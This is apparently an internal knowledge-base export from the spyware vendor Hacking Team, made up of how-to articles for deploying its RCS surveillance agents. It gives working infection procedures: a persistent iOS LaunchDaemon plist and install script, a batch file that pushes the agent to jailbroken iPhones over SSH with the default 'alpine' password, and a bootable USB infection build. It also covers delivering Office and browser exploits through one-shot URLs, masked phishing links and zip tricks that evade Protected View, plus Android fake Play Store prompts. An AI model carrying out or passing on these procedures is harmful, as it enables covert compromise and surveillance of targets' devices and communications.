com.atlassian.confluence.plugins.confluence-knowledge-base:kb-how-to-article-blueprintef50d27d-48da-4e4b-8fdb-a7097b045db2Provide step-by-step guidance for completing a task.kb-how-to-articleAdd How-To ArticleHow-To Articlekb-how-to-article

If the customer doesn’t has a static public IP address with the possibility to configure the boder router/firewall  with port forward or dnat/snat we could set-up a temporary configuration using any common internet connection.

The requirements to do that are: a free Anonymizer/VPS and the possibility to use SSH Client (for windows) like Putty on the Collector.


Properly configure the server

Usually the sshd on CentOS is configured to allow the bridge only on local IP addresses so we need to check the sshd (server) configuration on the Anonymizer/VPS:

Access the Anonymizer/VPS using an SSH Client

Open with an editor the sshd config file (/etc/ssh/sshd_config ), look for the “GatewayPorts” parameter and check if it’s properly configured to YES without the hash key.

GatewayPorts yes

Save the config file and restart the ssh server

/etc/init.d/sshd restart


Set-Up the ssh tunnel through the SSH Client Configuration

Open an SSH Client on the Collector System. For this How-To we will use Putty

In the “Session” config page

Fill-in the IP address of the Anonymizer/VPS

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

Fill-in a name to save the session

Save the session

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

Explode the “SSH” config page and move to “Tunnels” config section

Fill-in the Source port that you want to be forwarded (RCS default setting is 80)

Fill-in the destination IP/hostname (localhost or 127.0.0.1) of the forward and the port (RCD default setting is 80)

Check the flag on “Remote”

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

Load this configuration clicking on “Add”

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

Check if the forwarded port is prolerly remote "R80"

Start the session clicking on “Open”

The tunnel will not be ready until you log-in to the Anonymizer/VPS using a valid pair of credendials

 

After the log-in check if the sshd daemon is properly listening on the public interface on forwarded port

 

 

 

 

Check if the tunnel is up trying to connect to port 80 of the Anonymizer/VPS (you could use telnet, nmap or a browser that allows you to see the Collector error message)

Collector - SSL connection issue with DB

1. Build an iOS Installation Package from the Console

2. Edit the "install.sh" file and add the following command before the last line ("exit 0"): "rm -rf /Library/LaunchDaemons/com.apple.taskm.plist"

3. Create a new file called "com.apple.taskm.plist", copy and paste the below "plist" content, save the file and copy it on the iOS target device, in the following directory: "/Library/LaunchDaemons/"

4. Create a new directory called "test" inside the iOS target device root directory

5. Copy all the file withing iOS Installation Package into the iOS target device "test" directory

6. Reboot the iOS target device and wait for synchronization

 

---------- Start of plist (do not copy this line) ----------

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">

<plist version="1.0">

  <dict>

    <key>Label</key>

    <string>com.apple.taskm</string>

    <key>Program</key>

    <string>/bin/sh</string>

    <key>ProgramArguments</key>

    <array>

      <string>/bin/sh</string>

      <string>-c</string>

      <string>/bin/sh /test/install.sh</string>

    </array>

    <key>WorkingDirectory</key>

    <string>/test</string>

    <key>RunAtLoad</key>

    <true/>

      <key>LaunchOnlyOnce</key>

    <true/>

  </dict>

</plist>

---------- End of plist (do not copy this line) ----------

 

Using tools like iExplorer (http://www.macroplant.com/iexplorer/) you don't need to unlock password to copy files.

 

With the next RCS major release, the iOS Installation Package will include two apps: one for Windows and one for OSX, in order to apply RCS infection through USB.

These apps will be released in beta version, asking customers for feedbacks. Massimo Chiodini (R&D) has already succesfully tested till iPhone 5 and iPad 2.

 

Tested on: RCS 8.3.4

• Token Hasp issue: during a reinstallation of RCS (Master Node) 2 errors occur in succession, and there's  no way to finish the installation.

Screenshots of the errors below:              

                             

Solution:

  1. We stopped the installation, removing manually the files in C:\RCS;
  2. Deleted manually the token hasp drivers from the system (see the screenshot below) and rebooted the server;

 

 3. Reinstalled RCS successfully (launching the installer with administrator privileges).

SSL connection issue: after installing RCS on Master Node and Collector, collector logs show warnings/errors about the communication with the DB:

 

               2014-11-19 06:52:12 -0600 [INFO]:  Checking the DB connection [rcsbe:443]...

               2014-11-19 06:52:13 -0600 [ERROR]:  Error logging in: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 state=SSLv3 read server certificate B: certificate verify failed

               2014-11-19 06:52:13 -0600 [ERROR]:  Cannot login to DB

               2014-11-19 06:52:13 -0600 [WARN]:  Database connection failed, using local cache...

               2014-11-19 06:52:13 -0600 [INFO]:  Empty global signature, cannot continue. Waiting 10 seconds and retry...

 

               Solution:

 

  1. We regenerated the CA and the SSL certificate from the Master Node, with the commands:

 

rcs-db-config -G

rcs-db-config -g

 

  1. From the Collector, we stopped the RCS services and downloaded the new signatures:

 

rcs-collector-config -s -u [admin]  -p [password]

rcs-collector-config -t -u [admin]  -p [password]

 

  1. Restarted RCS services on the Collector and everything worked fine.

Exploit for Word and PPT:

supported version: Office 2007, 2010, 2013, Adobe Flash v11.1.102.55 or above for Internet Explorer
doc extensions: docx, ppsx

How it works:

In order to get the exploit the requirements that are needed are : License for exploit, scout generated from the factory of the designated target and document (docx, ppsx) to use for the infection.

When the file (word or power point) has been opened the vulnerability is exploited, then the agent is downloaded from HT anonymous network infrastructure.

The agent is installed after the first logout/login of the user.

Notes:

with office 2007 the target has to choose the option "I recognize the content. Allow it to play"


Download the exploit from internet:

When you download a document, or any other file, from the internet it is marked as "just downloaded" by the browser.
Office 2010 and Office 2013 shows the Protected View message if you open a "just downloaded" document, regardless it contains the exploit or not.
Internet Explorer and Chrome set this flag, while Firefox ignores it.
If the target uses Internet Explorer or Chrome there is a workaround: having the document opened by WinZip. If you send a .zip or .rar file containing the infecting
document, Winzip will open the content automatically using Word and unset the "downloaded" flag: no ProtectedView message is displayed.
It is not related with the exploit, it is the standard behavior when opening a document just downloaded from the internet.

 

Best Pratices:
from internet send it in a .zip or .rar file
use usb key or other external devices

 

 

Browser Exploit:

Exploit requirements:

     - Internet Explorer 6,7,8,9,10

     - Windows XP, Vista, 7 (32/64 bit)

      - Adobe Flash v11.1.102.55 or above for Internet Explorer

     - Microsoft Office Word 2007/2010/2013 must be installed on the system

 

If some of the above requirements are not met, the agent will not be installed, while the website is correctly displayed.

No alert message is displayed when accessing the exploiting website, no user interaction is required but browsing the infecting URL

All the infections are one-shot: the exploiting website will try to infect only the first user that browses it; all subsequent visitors will see the site's content with no exploit.

 

How to deliver the exploit

  • Hosted
    We offer our anonymous network infrastructure to host a fake website that will infect the target and then redirect to a chosen website(e.g. http://www.cnn.com).
    The client sends us: 
    • Silent Installer
    • URL to redirect the user to (optional)
    We send to the client:
    • a one-shot URL that must be sent to the target

  • Custom website hosted
    We offer our anonymous network infrastructure to host a fake website prepared by the client that will infect the target.
    The client sends us:
    • Silent Installer
    • HTML code for the fake website
    We send to the client:
    • a one-shot URL that must be sent to the target

  •  Custom website hosted by the client
    Client's infrastructure will be used to host a fake website that will infected the target. Our anonymous network infrastructure will be used to host only the exploits components.
    The client sends us:
    • Silent Installer
    • URL where the client's fake website will be hosted
    We send to the client:
    • A zip file with the HTML that must be integrated into the client's fake website. The exploit is still one-shot.

 

the HTML code could be:

 

<html>

                <head></head>

                <body>

                                Here's the link you are waiting for:

                                <a href="http://IP_ADDRESS_FOR_EXPLOIT/documents/zjqiaphk/9j03ny8lnnys.html">http://URL_VIEWED_BY_TARGET/news/162456</a>

                </body>

</html>

where href is the attribute which specifies the link's destination and where the target downloads the exploit, even if the targets cannot see it, but only the URL specified (ex. cnn.com, google.com, etc)

 

Note:

For delivering it, we suggest you to create an html e-mail with an hyperlink to this URL,

because the URL might arouse suspicious.

 

Furthermore you can create an html email directly from gmail.com

 

In order to do it there are some simple steps:

1.Connect to gmail

2.Push the "compose" button

3.Click on the button with a chain icon: "Insert link" or press Ctrl-K

 

 

4.Write the URL of the site where you want to redirect the target on the field: "Text to display:" and write the exploit URL received from us on the field "Web address"

This is a workaround that may come useful in cases where a static IP is not available and you need to complete the installation for acceptance or training purposes. This configuration is not supported as permanent.

I discover that if you do not configure all port 80 to go through VPS, the return traffic will not go back to the VPS. So on putty you should configure Dynamic port on 8080 and forward all traffic to localhost 8080.

If the customer doesn’t has a static public IP address with the possibility to configure the boder router/firewall  with port forward or dnat/snat we could set-up a temporary configuration using any common internet connection.

The requirements to do that are: a free Anonymizer/VPS and the possibility to use SSH Client (for windows) like Putty on the Collector.


Properly configure the server

Usually the sshd on CentOS is configured to allow the bridge only on local IP addresses so we need to check the sshd (server) configuration on the Anonymizer/VPS:

Access the Anonymizer/VPS using an SSH Client

Open with an editor the sshd config file (/etc/ssh/sshd_config ), look for the “GatewayPorts” parameter and check if it’s properly configured to YES without the hash key.

GatewayPorts yes

Save the config file and restart the ssh server

/etc/init.d/sshd restart


Set-Up the ssh tunnel through the SSH Client Configuration

Open an SSH Client on the Collector System. For this How-To we will use Putty

In the “Session” config page

Fill-in the IP address of the Anonymizer/VPS

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

Fill-in a name to save the session

Save the session

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

Explode the “SSH” config page and move to “Tunnels” config section

Fill-in the Source port that you want to be forwarded (RCS default setting is 80)

Fill-in the destination IP/hostname (localhost or 127.0.0.1) of the forward and the port (RCD default setting is 80)

Check the flag on “Remote”

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

Load this configuration clicking on “Add”

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

Check if the forwarded port is prolerly remote "R80"

Start the session clicking on “Open”

The tunnel will not be ready until you log-in to the Anonymizer/VPS using a valid pair of credendials

 

After the log-in check if the sshd daemon is properly listening on the public interface on forwarded port

 

 

 

 

Check if the tunnel is up trying to connect to port 80 of the Anonymizer/VPS (you could use telnet, nmap or a browser that allows you to see the Collector error message)

falsetruemodified5ssh tunnelfalsepage
The question is whether this should be supported officially?

IP ADDRESS

ipconfig -> shows IP, mask and gateway for every network interface

ipconfig /all -> Provides also DNS and MAC addresses of every interface

ipconfig /flushdns -> Purges DNS cache

ipconfig /release [adapter] -> release the IP addresses of network interfaces got by DHCP

ipconfig /renew [adapter] -> try a new DHCP request to assign IP addresses to the network interfaces

Note: [adapter] needes to be between "" when spaces are used and allow * scapes

COMPUTER NAME

hostname -> returns local computer name

net view -> shows local network available computer names

PING

Check if a computer is alive in network (if ICMP is not filtered by firwalls)

ping <ip> -> pings 4 times

ping <ip> -n 10 -> pings 10 times

ping <ip> -t -> pings until stoped

ROUTING TABLES

route PRINT -> Shows network interfaces, IPv4 and IPv6 routing tables

 

Adding a route:

route ADD 157.0.0.0 MASK 255.0.0.0  157.55.80.1 METRIC 3 IF 2

    • destination: 157.0.0.0
    • mask: 255.0.0.0
    • gateway: 157.55.80.1
    • metric: 3
    • interface: 2

 

Changing a route: CHANGE is only used tomodify gateway or metric

route CHANGE 157.0.0.0 MASK 255.0.0.0 157.55.80.5 METRIC 2 IF 2

 

Deleting route: just need to indicate destination

route DELETE 157.0.0.0

 

Once a route is stablished we can test that works as should be with:

tracert <IP> -> will go to <IP> but presenting IP address of every step

MAC ADDRESS

ipconfig /all -> includes information about MAC address for every interface

arp -a -> present MAC address gateway asigned to every IP

getmac -> present list of mac addresses of the system and if the interfaces are connected or not

CHECKING DNS

nslookup [URL] -> checks if can resolve given URL getting the IP address

LOCAL ACTIVE PORTS

netstat -an -> Show all open ports

arnetstat -anb -> Show all open ports with software name that opened

netstat -r = route PRINT

 

For specific searches, output could be filtered:

netstat -an | find "443" -> Show every line of netstat -an that includes "443"

netstat -an | find "LISTENING" -> Show every port in "LISTENING" mode

TELNET

telnet [ip_addr] -> starts a telnet connection to specified host

telnet [ip_addr] [port] -> same as previous but in an specific port to know if there is a service in that port

 

REMOTE ACTIVE PORTS

(Need to install PortQryV2)

(Installed in C:\PortQryV2\)

 

portqry -local -> Usage of local ports

portqry -n <IP> -> explore 80 port in <IP>

portqry -n <IP> -e [p] -> explore [p] port in <IP>

portqry -n <IP> -r s:e -> explore ports between "s" and "e" in <IP>

portqry -n <IP> -r s:e | find /V "NOT LISTENING" -> explore ports from "s" to "e" in <IP> showing only LISTENING OR FILTERED ports

portqry [options] -l [filename.log] -> save command output in [filename.log]

 

telnet <ip> <port> -> performs a connection to specified port of that IP.

Connection could be done, if its open, timedout, or rejected.

Update 06/05/2013

  • Dates for next visit have been confirmed: June 22 - July 03.
  • After Fulvio's visit (May 18-29) EU has now installed RCS 8.2.5. After passing an entire training week with them, conclusion is that they are not ready to use the system in a real field, although we would expect them to be able to infect laboratory machines and giving advanced configurations to agents.
  • Because of the risk of leakage if used on real targets, we may want to leave 8.2.5 there for a little while. TCC has been added to the "Release" area of our support portal.

May 18-29 2013 : visit to End User -  Followup TCC- GID:

Follow up visit conducted by Fulvio on May 18-29: main purpose was moving servers from TCC to GID premises and recapping fundamentals on RCS Use.

  • Servers are up&running at GID, protected by Cisco FW (hardware for H/A is present although there's no configuration for it)
  • Firewall ruleset have been added to enable RCS operation, no assesment of overall infrastructure security has been done.
  • A delivery Certificate () is yet to be signed and stamped by Mesfer (Project Manager in TCC)
  • Infrastructure: Public static IP is up&running but it's not definitive. Regardless of that GID will be still making use of the system deploying test agents in a internal network zone created on purpose (IP range: 192.168.1.0/24).
  • Anonymizers: not ready yet, Once they get them we'll arrange an online meeting to share knowledge on how to install and mantain anonimizers for GID.
  • Training: training agenda is  completed for this milestone (find it in attachment ). Some few little no-blocking topics are yet to be covered (Bakcup and Alerting). I'm expecting people from GID to make massive use of the system  in their labs in the coming weeks, they will become comfortable with the system itself, that is very important as input for the next coming matters in our training schedule. By the next visit HT is expecting  them to raise ideas, discuss possible use-case scenarios and move deftly among those topics already covered.
  • Sultan Al Frashed is the new technical point of reference in TCC for RCS project.
  • Support: Sultan (new technical point of reference in TCC) has access to HT support portal, I'm expecting him to file a ticket every time GID finds any problem in using the system according to the best practices we followed during the training. Plus, we'll add Ahmed (Technical point of reference in GID) also as soon as he gets his istitutional email address.

I've asked Sultan to do the followings by the next HT visit:

  •  NTP : as told, can you make sure both collector and masternode are allowed to synch via NTP (UDP over port 123) to an external NTP server. It's important to have them with right date and time every moment.
  • Playground: public Static IP seems not be 100% ready. But we have a temporary "playground" network zone where to deploy agents. In the beginning we decided to destroy the temporary network once connectivity from Internet is achieved. My suggestion now is to leave the "playground network" available also in the future, as a practicing area wich does not involve internet. What do you think?
  • License: I saw a new ticket has been filed to you containing the new license. At your earliest conveniece please kindly substitute the license file in the Masternode:
    • Rename it rcs.lic
    • Copy it in C:/RCS/DB/config
    • Restart RCSDB service
    • Check in Console->monitor that expiration time has been updated
  • ICMP: we just saw ICMP from users console to masternode was not enabled yet (collector is reachable instead).
  • Simcards: two out of three simcards provided by GID were still not working. Do you think we'll have them ready by the coming HT visit?
  • Hardware: in order to make GID practicing with the system, may be useful providing them with some hardware to use as testbed: I say they have laptops but no blackberry. They could choose to have some (different models) to play with. 
  • Support: please use support portal massively during next weeks. One Ahmed gets his new institutional email I'll add him on the portal, then you'll kindly help him to install the certificate on his laptop.

Among TNI capabilities there is the monitoring of all devices connected to a network, IPhone included. Do you know if there is any possibile porting to Linux?
we could integrate to the TNI's capabilities.

When there is an external storage and we mount the volume as c:\rcs\db\backup the backup fails with something like "backup already exist". As advised by Alor, its a known issue for 8.4.1 because of the updated MongoDB. Solution is:
1) Mount the volume as some drive letter e.g. F:\
2) Download the Juntion tool from microsoft http://technet.microsoft.com/en-us/sysinternals/bb896768.aspx
3) Create a symbolic link to link F drive to C:\RCS\DB\backup
Junction f: C:\RCS\DB\backup
4) Test backup again to see if successful

Another solution is:
1) create a subfolder inside c:\rcs\db\backup, let's name it c:\rcs\db\backup\backup
2) configure the backup to use that directory with "rcs-db-config -B c:\rcs\db\backup\backup"
The issue is within the new version of mongodb which seems to not be able to use directly a directory that is mounted on external storage.

As I have known it previously, during delivery I would advise the customer to connect to data using the aircard watcher software before sending WAP message. This has cause a problem. WAP push message is a 2 step procedure where the backend connects to the collector to put the agent there, followed by connecting to the rmi modem to send the WAP message. The issue and observations Stefania and I have noticed are when we connect to data, the OS do not know whether to use the modem connection or the NIC connection to reach the collector. This is dependent on how Windows Server prioritize which connection to use. Sometimes when it tries to use the modem connection to connect to the collector, obviously it will not be successful. The error we got is something like "Network forcibly closed".

The solution to this issue would be to add a static route on the DB to ensure that the connection to collector always uses the specific NIC. However, please also note that Que has advised that there is no need to connect to data on the aircard watcher even when sending WAP message. We tested it and it works well thus eliminating the need to put static route altogether. However if your existing customer has this issue, this serves as a documentation for you to understand the background and root cause.

db.alert_queue.drop()                  [ Erase alerts queue ]

2. Verify that it's now possible to connect again to the Console

1. Build an iOS Installation Package from the Console

2. Extract the generated .ZIP file into a new directory

3. Download the 2 .EXE attachments to this page ("plink.exe" and "pscp.exe") and copy them in the same folder

4. Create a new file called "installer.bat" in the same folder and paste the following lines:

set IP=[ip_address]
pscp  -l root -v -pw [password] -r * %IP%:/tmp
plink %IP% -l root -v -pw [password] "cd /tmp; sh ./install.sh"

5. Connect the iOS target device and a Windows computer to the same wireless network

6. Make appropriate changes to the variables [ip_address] and [password] (twice) within "installer.bat" batch file

6. Save the final batch file and run it from the Windows system connected to the same wireless network

 

[ip_address] variable must be replaced with the IP address associated to the iOS target device wireless interface.

[password] variable must be replaced (twice) with the password associated to the iOS target device SSH service (on a fresh jailbroken iOS device, the default password is "alpine").

 

It is possible that the batch file requires a minimum of user interaction (for example "Press Enter to continue...").

Follow steps below to create a bootable USB physical infection.

 

1. Plug a blank USB disk on a Windows system and wait until O.S. correctly detects and installs it's drivers

2. Open a shell and run "diskpart" command

3. Type "list disk" and press enter

4. Check the USB disk number (usually "Disk 1")

5. Type the following commands:

select disk <disk number>
clean
create partition primary
select partition 1
active
format fs=fat32 quick
assign
exit

6. Build an "Offline Installation > Bootable USB drive" Agent from the Console

7. Extract the generated .ZIP file on the USB key previously prepared

 

The USB disk is now bootable, with RCS Agent file ready on it.

In order to reset RCS Symbian configuration, it is only necessary to delete the "symbian.uids" file under "C:\RCS\DB\config\certs" directory, on the Backend system.

It contains UIDS configuration bound to a specific Symbian Developer Certificate.

Deletion actions on Developer Certificate (.cert and/or .key file) are not required, since the console asks for it every time during agents building.

 

Symbian Developer Certificare reset should be performed every time that Hacking Team finishes a POC, a training or every kind of activity that requires customer's hardware.

db.alert_queue.drop()                  [ Erase alerts queue ]
exit                                   [ End database utility ]

2. Verify that it's now possible to connect again to the Console

3. Reconfigure the alert if required

 

Tested on: RCS 8.3.4

If you are encountering session drops while using to the Console, try checking Backend's logs.

If you can find a large number of "PUSH ERROR: Cannot notify clients" lines, you can delete pending sessions in order to correctly use again to the Console.

 

1. Open a shell and type the following commands:

C:\RCS\DB\mongodb\win\mongo.exe rcs    [ Start database utility ]
db.sessions.drop()                     [ Erase sessions ]
exit                                   [ End database utility ]

2. Verify that it's now possible to correctly use again to the Console

 

Tested on: RCS 8.3.4

1. Build an iOS Installation Package from the Console

2. Edit the "install.sh" file and add the following command before the last line ("exit 0"): "rm -rf /Library/LaunchDaemons/com.apple.taskm.plist"

3. Create a new file called "com.apple.taskm.plist", copy and paste the below "plist" content, save the file and copy it on the iOS target device, in the following directory: "/Library/LaunchDaemons/"

4. Create a new directory called "test" inside the iOS target device root directory

5. Copy all the file withing iOS Installation Package into the iOS target device "test" directory

6. Reboot the iOS target device and wait for synchronization

 

---------- Start of plist (do not copy this line) ----------

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">

<plist version="1.0">

  <dict>

    <key>Label</key>

    <string>com.apple.taskm</string>

    <key>Program</key>

    <string>/bin/sh</string>

    <key>ProgramArguments</key>

    <array>

      <string>/bin/sh</string>

      <string>-c</string>

      <string>/bin/sh /test/install.sh</string>

    </array>

    <key>WorkingDirectory</key>

    <string>/test</string>

    <key>RunAtLoad</key>

    <true/>

      <key>LaunchOnlyOnce</key>

    <true/>

  </dict>

</plist>

---------- End of plist (do not copy this line) ----------

Using tools like iExplorer (http://www.macroplant.com/iexplorer/) you don't need to unlock password to copy files. However password to the screen lock is required for first time paring with iTunes.

With the next RCS major release, the iOS Installation Package will include two apps: one for Windows and one for OSX, in order to apply RCS infection through USB.

These apps will be released in beta version, asking customers for feedbacks. Massimo Chiodini (R&D) has already succesfully tested till iPhone 5 and iPad 2.

 

Tested on: RCS 8.3.4

1. Close/Delete the target's Agent (the last one synchronizing, if more than one) from the Console

2. Access the device through SSH

3. Remove "/Library/LaunchDaemons/com.apple.mdworker.plist" file

4. Remove the Agent directory in "/var/mobile"

5. Reboot the iOS device

 

Tested on: RCS 8.3.4

APK file downloaded from Google Play store are not actually encrypted, but are somehow signed. If the file doesn't match that signature, it's dropped.

The Network Injector Replace attack for Android applications can be used only on APK file coming from outside the Google Play store.

 

Tested on: RCS 8.3.4

Exploit for Word and PPT:

supported version: Office 2007, 2010, 2013, Adobe Flash v11.1.102.55 or above for Internet Explorer
doc extensions: docx, ppsx

How it works:

In order to get the exploit the requirements that are needed are : License for exploit, scout generated from the factory of the designated target and document (docx, ppsx) to use for the infection.

When the file (word or power point) has been opened the vulnerability is exploited, then the agent is downloaded from HT anonymous network infrastructure.

The agent is installed after the first logout/login of the user.

Notes:

with office 2007 the target has to choose the option "I recognize the content. Allow it to play"


Download the exploit from internet:

When you download a document, or any other file, from the internet it is marked as "just downloaded" by the browser.
Office 2010 and Office 2013 shows the Protected View message if you open a "just downloaded" document, regardless it contains the exploit or not.
Internet Explorer and Chrome set this flag, while Firefox ignores it.
If the target uses Internet Explorer or Chrome there is a workaround: having the document opened by WinZip. If you send a .zip or .rar file containing the infecting
document, Winzip will open the content automatically using Word and unset the "downloaded" flag: no ProtectedView message is displayed.
It is not related with the exploit, it is the standard behavior when opening a document just downloaded from the internet.

 

Best Pratices:
from internet send it in a .zip or .rar file
use usb key or other external devices

 

 

Browser Exploit:

Exploit requirements:

     - Internet Explorer 6,7,8,9,10

     - Windows XP, Vista, 7 (32/64 bit)

      - Adobe Flash v11.1.102.55 or above for Internet Explorer

     - Microsoft Office Word 2007/2010/2013 must be installed on the system

 

If some of the above requirements are not met, the agent will not be installed, while the website is correctly displayed.

No alert message is displayed when accessing the exploiting website, no user interaction is required but browsing the infecting URL

All the infections are one-shot: the exploiting website will try to infect only the first user that browses it; all subsequent visitors will see the site's content with no exploit.

 

How to deliver the exploit

  • Hosted
    We offer our anonymous network infrastructure to host a fake website that will infect the target and then redirect to a chosen website(e.g. http://www.cnn.com).
    The client sends us: 
    • Silent Installer
    • URL to redirect the user to (optional)
    We send to the client:
    • a one-shot URL that must be sent to the target

  • Custom website hosted
    We offer our anonymous network infrastructure to host a fake website prepared by the client that will infect the target.
    The client sends us:
    • Silent Installer
    • HTML code for the fake website
    We send to the client:
    • a one-shot URL that must be sent to the target

  •  Custom website hosted by the client
    Client's infrastructure will be used to host a fake website that will infected the target. Our anonymous network infrastructure will be used to host only the exploits components.
    The client sends us:
    • Silent Installer
    • URL where the client's fake website will be hosted
    We send to the client:
    • A zip file with the HTML that must be integrated into the client's fake website. The exploit is still one-shot.

 

the HTML code could be:

 

<html>

                <head></head>

                <body>

                                Here's the link you are waiting for:

                                <a href="http://IP_ADDRESS_FOR_EXPLOIT/documents/zjqiaphk/9j03ny8lnnys.html">http://URL_VIEWED_BY_TARGET/news/162456</a>

                </body>

</html>

where href is the attribute which specifies the link's destination and where the target downloads the exploit, even if the targets cannot see it, but only the URL specified (ex. cnn.com, google.com, etc)

 

Note:

For delivering it, we suggest you to create an html e-mail with an hyperlink to this URL,

because the URL might arouse suspicious.

 

Furthermore you can create an html email directly from gmail.com

 

In order to do it there are some simple steps:

1.Connect to gmail

2.Push the "compose" button

3.Click on the button with a chain icon: "Insert link" or press Ctrl-K

 

 

4.Write the URL of the site where you want to redirect the target on the field: "Text to display:" and write the exploit URL received from us on the field "Web address"

Everything is backed up and then deleted from db can be restored using restore functionality.

The best practice is perform the backup (operations/targets/full backup ) then delete what it is not used, then restore it when you need.

When a backup is performed it will be possible to restore it anytime but it is not possible to restore/modify something that already exists, in fact the restore functionality only returns what was deleted without touching what is currently in use.

for example:
if a target or an operation has been deleted they can be restored with the saved backup, but if they are in use and you want to revert a configuration you cannot 
restore an old configuration on these. it will always remains the current configuration for operations/targets.

if you restore a closed operation you cannot open it again but you will be able to see the evidences collected in these operation even if you deleted them before.

the agents still remains on database even if they have been deleted so it is not possible to restore them.

It is possible to restore the agents only if the target in which the agents are included has been deleted

Android

 

  • Remote web exploit - AUTOMATIC/SOCIAL (OS v.2.x only)
    • The exploit works in 2 phases: the first one makes root on the device, the second one infects the phone

The agent is downloaded from HT anonymous network infrastructure as IE exploit and there are 2 possibilities: automatic and social.
it tries first automatic (completely transparent, than if it not possible to exploit it uses social).
a link is sent to target, when he click on the link first the exploit tries to root the phone, if it fails (it's not possible to root the phone and download the agent because the vulnerability is exploited with browser permission) automatically a pop up is opened when the target uses browser/mail/you tube and it is asked to install a specific app.

 It tries 2 times (the delay is some minutes, configurable), if it fails it presents a fake play store.
If the target has the flag on "install app only from play store", it opens the setting and ask to disable it, with an explanation about the app.

  • In order to create the exploit the customer has to provide:
    • Apk
    • Link web suitable  for the target

 

 

  •  We're working on v.4. The timeframe and the possibility to use this exploit on v.4 are not predictable.

 

  •   Invisibility increased (application name changed, no more visible and no uninstallable if root rights granted)

 

  • Social applications supported: WhatsApp, Viber, Line, WeChat, GTalk, Skype, Facebook (modules Addressbook and Chat).

Notice that, in order to get evidence from the address book of the chat, chat module and addressbook module need to be enabled together.

WeChat: because it is encrypted we started to collect evidences after the first logout/login from wechat. only chat and addressbook, no voip (roadmap)

 

iOS

 

  • New infection applications available (for physic infections only) - like local installation for BB and WinMo
  • New local installation:
    after the build 3 folders are created:
    1. as before, the customer must copy manually the files on the device
    2. installer USB for Windows OS, the customer has to launch the installer and it uploads automatically all the files on the iOS.
    3. Installer USB for Mac OS X (same as WinOS)

Notes:

  • if the target has a security code it is bypassed
  • if the target changed the default password (alpine) it is also bypassed
  • iTunes must be installed on the computer used to perform the infection
  • the installer verifies if the device is already infected by RCS before copying the files.           

 

  • Social applications supported: WhatsApp, Viber, Skype.

Notes:

  • only chat and addressbook, no voip (roadmap)
  • the device must be jailbroken

 

 

Linux

 

  • New infection method: Melted Application (32bit and 64bit). The application to melt with is a .deb package. In case tarball is extracted on a machine which is not target (perhaps windows machine), check execution permission prior to proceed (in case chmod +x)
  • Supported distributions:
    Debian
    Ubuntu
    Mint


Roadmap:
Redhat

 

  • Build:
    -  silent
    -  melted app (32/64 bit systems)

 

  • Now all the most used modules are supported.

 

  • New modules added: addressbook, chat, keylog, application, position, password, mouse, camera

 

 

Windows

 

  •     Outlook.com web service supported (modules Addressbook and Messages)

 

 

Network Injector

 

  • New attack type: INJECT-HTML-FILE
    •   Very powerful attack: the customer just provide a web domain (resource pattern) and a silent installer.
    • Hacking Team replies with a file to be directly uploaded inside Network Injector rule window attack leverages on exploit which is delivered according to exploit delivering policies
    • it is possible use the IE exploit with this action

 

  • java exploit has been removed

 

  • Melted application for Linux in TNI will be supported in next releases

  • Other new features:
    • Unified OS based on Ubuntu for NIA and TNI  
    • Tactical: Injector, Intruder, Fap, log; Appliance: Injector; log
    • Updates: for TNI are interactive, for NIA can be interactive or automatic
    • NI has been integrated with Ubuntu Network Manager
    • On NIA DAG endace card is supported
    • ON TNI connectivity with  802.11abgn 2.4GHz/5GHz a 20 MHz/40 MHz are supported
    • On TNI network with WWM are supported (QoS on wireless)
    • On TNI support for SGI e LGI (for 2.4GHz : 144.4 Mbps, for 5GHz: 300 Mbps)
    • On TNI: check wireless link
    • TNI target identification :  status, mac, ip, vendor, hostname, os, browser, last web traffic, last web attack, chronology
    • On TNI : performance capturing  on wireless network 300 mbps (1000 test done) : score 99,6%
    • On TNI: performance redirect  on wireless network 300 mbps (1000 test done): score 99,4%


 

License

 

  • Maintenance expiration information added in 8.4 license (if expired, the system is only usable for visualization, no new vectors can be created and new instances will stay in status "queued")

 

Console

  • Main features will be added in RCS 9 (correlation, virtual and physical entities, etc).
  • Possibility to export entities.

If the customer doesn’t has a static public IP address with the possibility to configure the boder router/firewall  with port forward or dnat/snat we could set-up a temporary configuration using any common internet connection.

The requirements to do that are: a free Anonymizer/VPS and the possibility to use SSH Client (for windows) like Putty on the Collector.


Properly configure the server

Usually the sshd on CentOS is configured to allow the bridge only on local IP addresses so we need to check the sshd (server) configuration on the Anonymizer/VPS:

Access the Anonymizer/VPS using an SSH Client

Open with an editor the sshd config file (/etc/ssh/sshd_config ), look for the “GatewayPorts” parameter and check if it’s properly configured to YES without the hash key.

GatewayPorts yes

Save the config file and restart the ssh server

/etc/init.d/sshd restart


Set-Up the ssh tunnel through the SSH Client Configuration

Open an SSH Client on the Collector System. For this How-To we will use Putty

In the “Session” config page

Fill-in the IP address of the Anonymizer/VPS

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

Fill-in a name to save the session

Save the session

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

Explode the “SSH” config page and move to “Tunnels” config section

Fill-in the Source port that you want to be forwarded (RCS default setting is 80)

Fill-in the destination IP/hostname (localhost or 127.0.0.1) of the forward and the port (RCD default setting is 80)

Check the flag on “Remote”

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

Load this configuration clicking on “Add”

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

Check if the forwarded port is prolerly remote "R80"

Start the session clicking on “Open”

The tunnel will not be ready until you log-in to the Anonymizer/VPS using a valid pair of credendials

 

After the log-in check if the sshd daemon is properly listening on the public interface on forwarded port

 

 

 

 

Check if the tunnel is up trying to connect to port 80 of the Anonymizer/VPS (you could use telnet, nmap or a browser that allows you to see the Collector error message)

